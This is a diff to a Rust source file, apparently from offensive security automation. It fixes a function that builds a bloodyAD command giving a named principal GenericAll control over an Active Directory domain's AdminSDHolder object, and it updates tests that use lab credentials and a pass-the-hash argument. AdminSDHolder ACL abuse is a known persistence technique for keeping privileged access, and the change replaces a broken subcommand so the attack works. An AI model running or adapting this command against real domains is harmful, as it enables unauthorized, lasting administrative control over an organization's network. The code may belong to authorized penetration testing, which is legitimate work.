@@ -190,17 +190,23 @@ pub fn build_adminsd_holder_add_ace(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let principal = required_str(args, "principal")?;
-    let right = optional_str(args, "right").unwrap_or("FullControl");
+    let right = optional_str(args, "right").unwrap_or("GenericAll");
+
+    if !right.eq_ignore_ascii_case("GenericAll") && !right.eq_ignore_ascii_case("FullControl") {
+        anyhow::bail!(
+            "adminsd_holder_add_ace grants full control via `bloodyAD add genericAll`; \
+             right={right} is not expressible — use dacl_edit for a narrower ACE"
+        );
+    }
 
     let base_dn = domain_to_base_dn(domain);
     let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");
 
     Ok(credentials::bloodyad_base(args, domain, dc_ip)?
         .arg("add")
-        .arg("aclEntry")
+        .arg("genericAll")
         .arg(&adminsd_dn)
         .arg(principal)
-        .arg(right)
         .timeout_secs(120))
 }
 
@@ -857,22 +863,24 @@ mod tests {
             "dc_ip": "192.168.58.10",
             "principal": "jsmith"
         });
-        let right = optional_str(&args, "right").unwrap_or("FullControl");
-        assert_eq!(right, "FullControl");
+        let cmd = super::build_adminsd_holder_add_ace(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(argv.iter().any(|a| a == "genericAll"));
     }
 
     #[test]
-    fn adminsd_holder_custom_right() {
+    fn adminsd_holder_accepts_fullcontrol_as_genericall_alias() {
         let args = json!({
             "domain": "contoso.local",
             "username": "admin",
             "password": "P@ssw0rd!",
             "dc_ip": "192.168.58.10",
             "principal": "jsmith",
-            "right": "WriteProperty"
+            "right": "FullControl"
         });
-        let right = optional_str(&args, "right").unwrap_or("FullControl");
-        assert_eq!(right, "WriteProperty");
+        let cmd = super::build_adminsd_holder_add_ace(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(argv.iter().any(|a| a == "genericAll"));
     }
 
     #[test]
@@ -2198,5 +2206,32 @@ mod tests {
             .iter()
             .any(|a| a == "CN=AdminSDHolder,CN=System,DC=fabrikam,DC=local"));
         assert_eq!(flag_value(argv, "-p"), Some(format!("{LM}:{NT}").as_str()));
+    }
+
+    #[test]
+    fn adminsd_holder_uses_a_real_bloodyad_subcommand() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice", "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10", "principal": "bob"
+        });
+        let cmd = super::build_adminsd_holder_add_ace(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(
+            argv.iter().any(|a| a == "genericAll"),
+            "must use a valid `bloodyAD add` verb; argv={argv:?}"
+        );
+        assert!(
+            !argv.iter().any(|a| a == "aclEntry"),
+            "aclEntry is not a bloodyAD subcommand and always fails; argv={argv:?}"
+        );
+    }
+
+    #[test]
+    fn adminsd_holder_rejects_rights_genericall_cannot_express() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice", "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10", "principal": "bob", "right": "WriteDacl"
+        });
+        assert!(super::build_adminsd_holder_add_ace(&args).is_err());
     }
 }
